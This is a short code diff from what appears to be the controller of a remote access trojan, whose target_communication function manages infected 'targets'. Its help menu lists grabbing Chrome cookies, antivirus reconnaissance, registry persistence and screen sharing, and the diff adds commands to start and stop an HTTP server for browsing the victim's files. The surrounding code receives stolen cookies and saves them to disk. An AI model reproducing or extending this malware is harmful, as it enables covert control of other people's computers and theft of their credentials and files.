@@ -432,6 +432,8 @@ def target_communication(target, ip):
                     playsound                          --> play wav file in the background (just .wav)
                     av_recon                           --> Get Infos about Av
                     Get-Cookies                        --> Grab Cookies From Chrome
+                    Http-Server                        --> Start python Http Server for Browsing Files
+                    Http-Sestop                        --> Stop the Http-server
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
@@ -489,9 +491,13 @@ def target_communication(target, ip):
                     cookeis.write(reliable_recv(target))
                     cookeis.close()
                 print("Cookies Saved As Chrome-"+username+".txt")
+
+
             else:
                 result = reliable_recv(target)
                 print(result)
+
+
 
     except:
         targets.remove(target)
